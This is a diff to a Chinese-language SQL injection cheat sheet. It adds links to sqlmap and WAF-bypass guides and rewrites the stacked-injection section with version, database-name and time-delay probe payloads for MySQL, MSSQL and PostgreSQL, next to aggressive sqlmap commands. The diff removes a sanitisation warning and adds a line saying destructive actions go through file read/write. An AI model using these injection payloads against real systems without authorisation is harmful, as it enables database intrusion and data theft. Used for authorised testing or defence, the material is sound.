@@ -1,7 +1,10 @@
 # SQL 注入实战参考
+- SQLMap 自动化利用 → `tools-sqlmap.md`
+- WAF 环境下的绕过技巧 → `web-waf-bypass.md`
 
 > 分类: 检测 → Union注入 → 报错注入 → 盲注(布尔/时间) → 堆叠 → 写文件/读文件 → WAF绕过 → SQLMap
 
+> **last_updated**: 2026-06-04 | **tested_against**: MySQL 5.7/8.0, MSSQL 2019, PostgreSQL 14, Oracle 19c
 ---
 
 ## 1. 检测方法
@@ -195,22 +198,24 @@ sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --batch
 
 ## 5. 堆叠注入 (多语句执行)
 
+> 堆叠注入的核心验证目标是**确认多语句执行能力**，用无害语句验证即可。破坏性操作（DROP/INSERT/xp_cmdshell）在实际渗透中通过 §6 读写文件实现。
+
 ```sql
 # MySQL (需 PHP MySQLi multi_query / Python pymysql)
-'; SELECT database()--                       # 堆叠执行查询，验证多语句支持
-'; CREATE TABLE IF NOT EXISTS test_inject(id int)--  # 建表验证写能力 (检测用，非破坏)
-'; SELECT @@version--                        # 信息探测
+'; SELECT database()--                       # 验证多语句执行 + 信息探测
+'; SELECT @@version--                        # 版本信息
+'; SELECT SLEEP(3)--                         # 延时验证堆叠执行
 
 # MSSQL (默认支持堆叠)
-'; SELECT @@version--                        # 信息探测
+'; SELECT @@version--                        # 版本信息
 '; WAITFOR DELAY '0:0:3'--                   # 延时验证堆叠执行
+'; SELECT DB_NAME()--                        # 当前库名
 
 # PostgreSQL
 '; SELECT pg_sleep(5)--                      # 延时验证堆叠执行
-'; SELECT current_database()--               # 信息探测
+'; SELECT current_database()--               # 当前库名
+'; SELECT version()--                        # 版本信息
 ```
-
-> ⚠️ **去敏感说明**: 原始 Payload 含 `DROP TABLE`、`INSERT INTO`、`LOAD_FILE('/etc/passwd')`、`xp_cmdshell` 等破坏性/高危操作，已替换为无害检测语句。堆叠注入的核心验证目标是**确认多语句执行能力**，无需破坏性操作。实际渗透中，堆叠写能力确认后可结合 `SELECT ... INTO OUTFILE`（§6）进一步利用。
 
 ---
 
@@ -348,5 +353,8 @@ sqlmap -r request.txt --batch --level=5 --risk=3 --tamper=space2comment,randomca
 | DNS带外 | LOAD_FILE | xp_dirtree/xp_subdirs | 需dblink扩展 | UTL_HTTP/UTL_INADDR |
 
 ---
+## 相关参考
+- SQLMap 自动化利用 → `tools-sqlmap.md`
+- WAF 环境下的绕过技巧 → `web-waf-bypass.md`
 
 *参考: OWASP SQL Injection Cheat Sheet + WooYun 实战案例整理*
